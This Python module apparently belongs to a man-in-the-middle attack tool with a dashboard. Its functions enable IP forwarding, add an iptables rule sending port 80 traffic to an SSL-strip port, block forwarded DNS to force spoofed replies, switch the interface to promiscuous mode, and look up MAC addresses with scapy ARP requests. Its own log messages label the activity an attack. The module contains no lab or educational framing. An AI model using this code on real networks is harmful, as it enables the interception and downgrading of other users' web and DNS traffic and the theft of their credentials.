import time
import os
import scapy.all as scapy
import subprocess
from . import STATUS, SSL_STRIP_PORT

# GLOBAL STATE TRACKERS
IPTABLES_STATE = False 
SILENCE_UNTIL = 0  # <--- New local variable to track silence

def activate_silence_timer():
    """ Called by app.py when Stop is pressed. Logs once, then mutes. """
    global SILENCE_UNTIL
    
    # 1. Manually log the "Stopped" message BEFORE muting
    # This ensures you see it in the terminal and dashboard
    timestamp = time.strftime('%H:%M:%S')
    msg = f"[{timestamp}] [-] ATTACK STOPPED: Restoring network..."
    
    # Update global logs manually since log_msg won't work in a moment
    if len(STATUS["logs"]) > 100: STATUS["logs"].pop(0)
    STATUS["logs"].append(msg)
    STATUS["all_logs"].append(msg)
    print(msg)

    # 2. Activate Silence (Blocks the ghost thread's noise for 4s)
    SILENCE_UNTIL = time.time() + 4

def log_msg(message):
    global SILENCE_UNTIL
    
    # 1. ENFORCE SILENCE
    # If current time is before the silence expiration, DO NOT LOG.
    if time.time() < SILENCE_UNTIL:
        return

    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    
    # 2. Update View (Limited size, clearable)
    if len(STATUS["logs"]) > 100: STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    
    # 3. Update History (Unlimited, permanent)
    STATUS["all_logs"].append(full_msg)
    
    print(full_msg)

def set_ip_forwarding(value):
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except: pass

def set_port_forwarding(enable):
    global IPTABLES_STATE
    
    # Silence check for iptables logs too
    if time.time() < SILENCE_UNTIL: return

    try:
        if enable:
            if IPTABLES_STATE: return 
            cmd = f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
            os.system(cmd)
            log_msg(f"[NET] Traffic Redirection: ENABLED (Port 80 -> {SSL_STRIP_PORT})")
            IPTABLES_STATE = True
        else:
            if not IPTABLES_STATE: return 
            cmd = f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
            os.system(cmd)
            log_msg(f"[SYSTEM] IP Tables rule REMOVED for SSL Strip.")
            IPTABLES_STATE = False
    except Exception as e:
        log_msg(f"[!] IP Tables Error: {e}")

def set_dns_blocking(enable):
    try:
        if enable:
            rule = f"iptables -I FORWARD -i {STATUS['interface']} -p udp --dport 53 -j DROP"
            os.system(rule)
            log_msg("[SYSTEM] DNS Forwarding BLOCKED (Force Fake Response)")
        else:
            rule = f"iptables -D FORWARD -i {STATUS['interface']} -p udp --dport 53 -j DROP"
            os.system(rule)
            log_msg("[SYSTEM] DNS Forwarding Restored")
    except Exception as e:
        log_msg(f"[!] DNS Rules Error: {e}")

def set_promiscuous_mode(interface, enable):
    try:
        if os.geteuid() != 0: return 
        action = "promisc" if enable else "-promisc"
        if os.path.exists('/sbin/ip') or os.path.exists('/usr/sbin/ip') or os.path.exists('/bin/ip'): 
            subprocess.run(['ip', 'link', 'set', interface, action, 'on' if enable else 'off'], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif os.path.exists('/sbin/ifconfig'): 
            subprocess.run(['ifconfig', interface, action], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if enable:
            log_msg(f"[+] Interface {interface} set to Promiscuous Mode.")
    except Exception as e:
        log_msg(f"[!] Warning: Could not set Promiscuous Mode: {e}")

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = scapy.srp(broadcast/arp_request, timeout=1, verbose=False, iface=STATUS["interface"])[0] 
        return answered_list[0][1].hwsrc if answered_list else None
    except: return None